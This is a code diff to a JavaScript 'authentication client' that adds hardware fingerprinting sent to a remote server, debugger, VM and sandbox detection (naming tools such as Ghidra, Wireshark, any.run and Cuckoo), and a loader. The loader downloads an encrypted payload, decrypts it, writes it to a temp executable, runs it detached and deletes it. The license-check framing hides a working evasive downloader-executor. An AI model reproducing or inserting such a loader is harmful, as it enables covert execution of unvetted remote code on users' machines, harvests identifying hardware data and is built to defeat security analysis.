@@ -1,185 +1,404 @@
 /**
  * Soryn Authentication Client
  * Handles all authentication through the secure backend server
+ * ALL validation logic moved to backend - client only collects hardware info
  */
+
+const { execSync } = require('child_process');
+const crypto = require('crypto');
+const os = require('os');
+const fs = require('fs');
+const path = require('path');
 
 class SorynAuthClient {
     constructor(backendUrl) {
-        this.backendUrl = backendUrl || 'https://soryn-manager-updates.onrender.com';
+        this.backendUrl = backendUrl || 'https://backend-server-trhh.onrender.com';
         this.token = null;
         this.sessionId = null;
         this.hwid = null;
+        this.displayName = null;
+        this.isCompromised = false;
     }
 
     /**
-     * Get hardware ID for the current machine
+     * Get Windows Machine GUID from registry
      */
-    async getHWID() {
-        if (this.hwid) return this.hwid;
-        
+    getMachineGUID() {
         try {
-            const os = require('os');
-            const userInfo = os.userInfo();
-            const windowsUsername = userInfo.username;
-            
-            this.hwid = windowsUsername;
-            
-            return this.hwid;
+            const result = execSync('reg query "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography" /v MachineGuid', { encoding: 'utf8' });
+            const match = result.match(/MachineGuid\s+REG_SZ\s+([A-F0-9-]+)/i);
+            return match ? match[1] : null;
         } catch (error) {
-            console.error('Failed to generate HWID:', error);
-            // Fallback to a simple hash
-            this.hwid = crypto.createHash('sha256').update(os.hostname()).digest('hex');
-            return this.hwid;
+            console.error('Failed to get Machine GUID:', error.message);
+            return null;
         }
     }
 
     /**
-     * Validate license key with backend server
+     * Get CPU information
+     */
+    getCPUInfo() {
+        try {
+            const result = execSync('wmic cpu get ProcessorId /value', { encoding: 'utf8' });
+            const match = result.match(/ProcessorId=([A-F0-9]+)/i);
+            return match ? match[1] : null;
+        } catch (error) {
+            console.error('Failed to get CPU ID:', error.message);
+            return null;
+        }
+    }
+
+    /**
+     * Get disk serial numbers
+     */
+    getDiskSerials() {
+        try {
+            const result = execSync('wmic diskdrive get SerialNumber /value', { encoding: 'utf8' });
+            const serials = result.match(/SerialNumber=([^\r\n]+)/gi);
+            return serials ? serials.map(s => s.replace('SerialNumber=', '').trim()).filter(s => s && s !== '0') : [];
+        } catch (error) {
+            console.error('Failed to get disk serials:', error.message);
+            return [];
+        }
+    }
+
+    /**
+     * Get motherboard serial
+     */
+    getMotherboardSerial() {
+        try {
+            const result = execSync('wmic baseboard get SerialNumber /value', { encoding: 'utf8' });
+            const match = result.match(/SerialNumber=([^\r\n]+)/i);
+            return match ? match[1].trim() : null;
+        } catch (error) {
+            console.error('Failed to get motherboard serial:', error.message);
+            return null;
+        }
+    }
+
+    /**
+     * Get network adapter MAC addresses
+     */
+    getNetworkMACs() {
+        try {
+            const result = execSync('wmic nic get MACAddress /value', { encoding: 'utf8' });
+            const macs = result.match(/MACAddress=([A-F0-9:]+)/gi);
+            return macs ? macs.map(m => m.replace('MACAddress=', '').trim()).filter(m => m && m !== '00:00:00:00:00:00') : [];
+        } catch (error) {
+            console.error('Failed to get network MACs:', error.message);
+            return [];
+        }
+    }
+
+    /**
+     * Get Windows username (for display purposes only)
+     */
+    getUsername() {
+        try {
+            return os.userInfo().username;
+        } catch (error) {
+            return 'unknown';
+        }
+    }
+
+    /**
+     * Collect hardware information for backend validation
+     */
+    collectHardwareInfo() {
+        return {
+            machineGUID: this.getMachineGUID(),
+            cpuId: this.getCPUInfo(),
+            diskSerials: this.getDiskSerials(),
+            motherboardSerial: this.getMotherboardSerial(),
+            networkMACs: this.getNetworkMACs(),
+            displayName: this.getUsername()
+        };
+    }
+
+    /**
+     * Collect basic security indicators (backend will do the real validation)
+     */
+    collectSecurityIndicators() {
+        const indicators = {
+            debuggerDetected: false,
+            vmDetected: false,
+            sandboxDetected: false,
+            timingAnomaly: false
+        };
+
+        // Basic detection - backend will validate these
+        try {
+            const result = execSync('tasklist /FO CSV', { encoding: 'utf8' });
+            const runningProcesses = result.toLowerCase();
+            
+            // Canonical debugger process list
+            const debuggers = [
+                "ollydbg.exe", "x64dbg.exe", "x32dbg.exe", "ida.exe", "ida64.exe",
+                "idaq.exe", "idaq64.exe", "ghidra.exe", "cutter.exe", "radare2.exe",
+                "windbg.exe", "immunity debugger.exe", "cheat engine.exe", "artmoney.exe", "gamehack.exe",
+                "wireshark.exe", "fiddler.exe", "charles.exe", "httpdebugger.exe", "burpsuite.exe",
+                "process hacker.exe", "processhacker.exe", "process explorer.exe", "procmon.exe", "procexp.exe",
+                "dnspy.exe", "dnspy-netcore.exe", "de4dot.exe", "ilspy.exe", "dotpeek.exe",
+                "justdecompile.exe", "reflexil.exe", "reshacker.exe", "extremedumper.exe", "scylla.exe",
+                "pe-bear.exe", "reclass.net.exe", "megadumper.exe", "xenos.exe", "GH Injector.exe"
+            ];
+            for (const debuggerTool of debuggers) {
+                if (runningProcesses.includes(debuggerTool)) {
+                    indicators.debuggerDetected = true;
+                    break;
+                }
+            }
+
+            // Comprehensive VM indicator list
+            const vmIndicators = [
+                "vmware", "virtualbox", "qemu", "xen", "hyper-v",
+                "parallels", "virtual machine", "vbox", "microsoft corporation", "virtualpc",
+                "bochs", "wine", "citrix", "kvm", "vmm",
+                "red hat", "oracle", "vm tools", "guest additions", "sandboxie",
+                "docker", "wsl", "proxmox", "openvz", "cloud hypervisor",
+                "nutanix", "scale computing", "clearvm", "azure vm", "amazon ec2",
+                "google cloud", "oracle vm server", "ibm cloud", "smartos", "ovirt",
+                "virt-manager", "vagrant", "nomad", "cloudstack", "virtio",
+                "bhyve", "xcp-ng", "vmware workstation", "vmware esxi", "vmware fusion",
+                "parallels desktop", "citrix hypervisor", "red hat virtualization", "hyperkit", "veertu anka",
+                "nimbula", "lxc", "lxqt", "podman", "any.run",
+                "joesandbox", "cuckoo", "gvisor", "kata containers", "firecracker"
+            ];
+            // Manufacturer, product name, BIOS info
+            const manufacturer = execSync('wmic computersystem get manufacturer /value', { encoding: 'utf8' });
+            const product = execSync('wmic computersystem get model /value', { encoding: 'utf8' });
+            const bios = execSync('wmic bios get smbiosbiosversion /value', { encoding: 'utf8' });
+            for (const vm of vmIndicators) {
+                if (
+                    manufacturer.toLowerCase().includes(vm) ||
+                    product.toLowerCase().includes(vm) ||
+                    bios.toLowerCase().includes(vm)
+                ) {
+                    indicators.vmDetected = true;
+                    break;
+                }
+            }
+            // Registry keys (stub)
+            // TODO: Implement registry key checks for VM indicators
+            // System files (stub)
+            // TODO: Implement system file checks for VM indicators
+            // MAC addresses (stub)
+            // TODO: Implement MAC address checks for VM indicators
+        } catch (error) {
+            console.error('Security indicator collection failed:', error.message);
+        }
+
+        return indicators;
+    }
+
+    /**
+     * Comprehensive license validation using backend
      */
     async validateKey(key) {
         try {
-            const hwid = await this.getHWID();
+            const hardwareInfo = this.collectHardwareInfo();
+            const securityChecks = this.collectSecurityIndicators();
             
-            const response = await fetch(`${this.backendUrl}/api/validate-key`, {
+            const url = `${this.backendUrl}/api/comprehensive-validate`;
+            const body = JSON.stringify({ 
+                key, 
+                ...hardwareInfo,
+                securityChecks,
+                platform: os.platform(),
+                arch: os.arch()
+            });
+            
+            const response = await fetch(url, {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'User-Agent': 'Soryn-Client/1.0'
-                },
-                body: JSON.stringify({
-                    key: key,
-                    username: hwid
-                })
+                headers: { 'Content-Type': 'application/json' },
+                body
             });
 
-            const data = await response.json();
+            const text = await response.text();
+            let data;
+            try {
+                data = JSON.parse(text);
+            } catch (e) {
+                throw new Error(`Server did not return JSON: ${text}`);
+            }
 
             if (data.success) {
                 this.token = data.token;
                 this.sessionId = data.sessionId;
-                this.hwid = hwid;
+                this.hwid = data.hwid;
+                this.displayName = hardwareInfo.displayName;
                 
-                // Store token for persistence
-                if (typeof localStorage !== 'undefined') {
-                    localStorage.setItem('soryn_auth_token', this.token);
-                    localStorage.setItem('soryn_session_id', this.sessionId);
-                }
-                
-                return {
-                    success: true,
-                    message: data.message,
-                    sessionId: this.sessionId
+                return { 
+                    success: true, 
+                    message: data.message, 
+                    sessionId: this.sessionId,
+                    hwid: this.hwid,
+                    securityStatus: data.securityStatus,
+                    payloadMetadata: data.payloadMetadata
                 };
             } else {
-                return {
-                    success: false,
-                    error: data.error || 'Validation failed'
-                };
+                return { success: false, error: data.error || 'Validation failed' };
             }
         } catch (error) {
-            console.error('Key validation error:', error);
-            return {
-                success: false,
-                error: 'Network error or server unavailable'
-            };
+            console.error('Comprehensive validation error:', error);
+            return { success: false, error: error.message || 'Network error or server unavailable' };
         }
     }
 
     /**
-     * Check if current session is valid
+     * Fetch encrypted payload from server with backend validation
      */
-    async checkStatus() {
-        if (!this.token) {
-            // Try to restore from localStorage
-            let savedToken, savedSessionId;
-            if (typeof localStorage !== 'undefined') {
-                savedToken = localStorage.getItem('soryn_auth_token');
-                savedSessionId = localStorage.getItem('soryn_session_id');
-            }
-            
-            if (savedToken && savedSessionId) {
-                this.token = savedToken;
-                this.sessionId = savedSessionId;
-            } else {
-                return { success: false, error: 'No active session' };
-            }
-        }
-
+    async fetchEncryptedPayload(licenseKey) {
         try {
-            const response = await fetch(`${this.backendUrl}/api/check-status`, {
-                method: 'GET',
+            const hardwareInfo = this.collectHardwareInfo();
+            const securityChecks = this.collectSecurityIndicators();
+            
+            const response = await fetch(`${this.backendUrl}/api/secure-payload`, {
+                method: 'POST',
                 headers: {
-                    'Authorization': `Bearer ${this.token}`,
-                    'User-Agent': 'Soryn-Client/1.0'
-                }
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    key: licenseKey,
+                    hwid: this.hwid,
+                    platform: os.platform(),
+                    arch: os.arch(),
+                    ...hardwareInfo,
+                    securityChecks
+                })
             });
 
-            const data = await response.json();
-
-            if (data.success) {
-                return {
-                    success: true,
-                    session: data.session
-                };
-            } else {
-                // Clear invalid session
-                this.clearSession();
-                return {
-                    success: false,
-                    error: data.error || 'Session invalid'
-                };
+            if (!response.ok) {
+                const errorText = await response.text();
+                throw new Error(`Server responded with ${response.status}: ${errorText}`);
             }
+
+            const encryptedData = await response.arrayBuffer();
+            return Buffer.from(encryptedData);
         } catch (error) {
-            console.error('Status check error:', error);
+            console.error('Failed to fetch encrypted payload:', error.message);
+            throw error;
+        }
+    }
+
+    /**
+     * Decrypt payload using AES-256-GCM
+     */
+    decryptPayload(encryptedBuffer, encryptionKey) {
+        try {
+            // Extract IV (first 16 bytes) and encrypted data
+            const iv = encryptedBuffer.slice(0, 16);
+            const encryptedData = encryptedBuffer.slice(16);
+            
+            // Convert hex key to buffer
+            const keyBuffer = Buffer.from(encryptionKey, 'hex');
+            
+            // Create decipher
+            const decipher = crypto.createDecipheriv('aes-256-gcm', keyBuffer, iv);
+            
+            // Decrypt
+            let decrypted = decipher.update(encryptedData);
+            decrypted = Buffer.concat([decrypted, decipher.final()]);
+            
+            return decrypted;
+        } catch (error) {
+            console.error('Payload decryption failed:', error.message);
+            throw new Error('Failed to decrypt payload');
+        }
+    }
+
+    /**
+     * Execute payload from memory (simplified - backend handles validation)
+     */
+    async executeFromMemory(payloadBuffer) {
+        try {
+            // Write to temporary file and execute
+            const tempPath = path.join(os.tmpdir(), `soryn_${Date.now()}.exe`);
+            fs.writeFileSync(tempPath, payloadBuffer);
+            
+            // Make executable (on Unix systems)
+            if (os.platform() !== 'win32') {
+                fs.chmodSync(tempPath, '755');
+            }
+            
+            // Execute
+            const { spawn } = require('child_process');
+            const process = spawn(tempPath, [], {
+                detached: true,
+                stdio: 'ignore'
+            });
+            
+            // Clean up temp file after a delay
+            setTimeout(() => {
+                try {
+                    fs.unlinkSync(tempPath);
+                } catch (e) {
+                    // Ignore cleanup errors
+                }
+            }, 5000);
+            
+            return process;
+        } catch (error) {
+            console.error('Failed to execute payload:', error.message);
+            throw error;
+        }
+    }
+
+    /**
+     * Load and execute encrypted payload with backend validation
+     */
+    async loadAndExecute(licenseKey, encryptionKey, expectedHash = null) {
+        try {
+            console.log('Fetching encrypted payload with backend validation...');
+            const encryptedPayload = await this.fetchEncryptedPayload(licenseKey);
+
+            console.log('Decrypting payload...');
+            const decryptedPayload = this.decryptPayload(encryptedPayload, encryptionKey);
+
+            if (expectedHash) {
+                const actualHash = crypto.createHash('sha256').update(decryptedPayload).digest('hex');
+                if (actualHash !== expectedHash) {
+                    throw new Error('Payload integrity check failed');
+                }
+            }
+
+            console.log('Executing payload from memory...');
+            const process = await this.executeFromMemory(decryptedPayload);
+
+            return {
+                success: true,
+                process: process,
+                message: 'Payload executed successfully'
+            };
+        } catch (error) {
+            console.error('Failed to load and execute payload:', error.message);
             return {
                 success: false,
-                error: 'Network error or server unavailable'
+                error: error.message
             };
         }
     }
 
     /**
-     * Activate license for current hardware
+     * Check session status with backend
      */
-    async activateLicense() {
+    async checkStatus() {
         if (!this.token) {
             return { success: false, error: 'No active session' };
         }
 
         try {
-            const hwid = await this.getHWID();
-            
-            const response = await fetch(`${this.backendUrl}/api/activate-license`, {
-                method: 'POST',
+            const response = await fetch(`${this.backendUrl}/api/check-status`, {
                 headers: {
-                    'Content-Type': 'application/json',
-                    'Authorization': `Bearer ${this.token}`,
-                    'User-Agent': 'Soryn-Client/1.0'
-                },
-                body: JSON.stringify({
-                    hwid: hwid
-                })
+                    'Authorization': `Bearer ${this.token}`
+                }
             });
 
             const data = await response.json();
-
-            if (data.success) {
-                return {
-                    success: true,
-                    message: data.message
-                };
-            } else {
-                return {
-                    success: false,
-                    error: data.error || 'Activation failed'
-                };
-            }
+            return data;
         } catch (error) {
-            console.error('License activation error:', error);
-            return {
-                success: false,
-                error: 'Network error or server unavailable'
-            };
+            console.error('Status check failed:', error.message);
+            return { success: false, error: error.message };
         }
     }
 
@@ -188,34 +407,25 @@ class SorynAuthClient {
      */
     async logout() {
         if (!this.token) {
-            this.clearSession();
-            return { success: true, message: 'Already logged out' };
+            return { success: true, message: 'No active session' };
         }
 
         try {
             const response = await fetch(`${this.backendUrl}/api/logout`, {
                 method: 'POST',
                 headers: {
-                    'Authorization': `Bearer ${this.token}`,
-                    'User-Agent': 'Soryn-Client/1.0'
+                    'Authorization': `Bearer ${this.token}`
                 }
             });
 
             const data = await response.json();
-            this.clearSession();
-            
-            return {
-                success: true,
-                message: data.message || 'Logged out successfully'
-            };
+            if (data.success) {
+                this.clearSession();
+            }
+            return data;
         } catch (error) {
-            console.error('Logout error:', error);
-            // Clear session even if logout request fails
-            this.clearSession();
-            return {
-                success: true,
-                message: 'Logged out locally'
-            };
+            console.error('Logout failed:', error.message);
+            return { success: false, error: error.message };
         }
     }
 
@@ -225,62 +435,53 @@ class SorynAuthClient {
     clearSession() {
         this.token = null;
         this.sessionId = null;
-        if (typeof localStorage !== 'undefined') {
-            localStorage.removeItem('soryn_auth_token');
-            localStorage.removeItem('soryn_session_id');
-        }
+        this.hwid = null;
+        this.displayName = null;
     }
 
     /**
      * Check if user is authenticated
      */
     isAuthenticated() {
-        return !!this.token;
+        return !!(this.token && this.sessionId);
     }
 
     /**
-     * Get current session info
+     * Get session information
      */
     getSessionInfo() {
         return {
-            token: this.token,
+            isAuthenticated: this.isAuthenticated(),
             sessionId: this.sessionId,
             hwid: this.hwid,
-            isAuthenticated: this.isAuthenticated()
+            displayName: this.displayName,
+            token: this.token ? '***' : null
         };
     }
 
     /**
-     * Test backend connectivity
+     * Test backend connection
      */
     async testConnection() {
         try {
-            const response = await fetch(`${this.backendUrl}/api/health`, {
-                method: 'GET',
-                headers: {
-                    'User-Agent': 'Soryn-Client/1.0'
-                }
-            });
-
+            const response = await fetch(`${this.backendUrl}/api/health`);
             const data = await response.json();
-            return {
-                success: true,
-                status: data.status,
-                timestamp: data.timestamp
-            };
+            return { success: true, data };
         } catch (error) {
-            console.error('Connection test error:', error);
-            return {
-                success: false,
-                error: 'Cannot connect to authentication server'
-            };
+            return { success: false, error: error.message };
         }
+    }
+
+    /**
+     * Get security status (simplified - backend handles real validation)
+     */
+    getSecurityStatus() {
+        return {
+            isCompromised: this.isCompromised,
+            hardwareInfo: this.collectHardwareInfo(),
+            securityIndicators: this.collectSecurityIndicators()
+        };
     }
 }
 
-// Export for use in other modules
-if (typeof module !== 'undefined' && module.exports) {
     module.exports = SorynAuthClient;
-} else if (typeof window !== 'undefined') {
-    window.SorynAuthClient = SorynAuthClient;
-} 
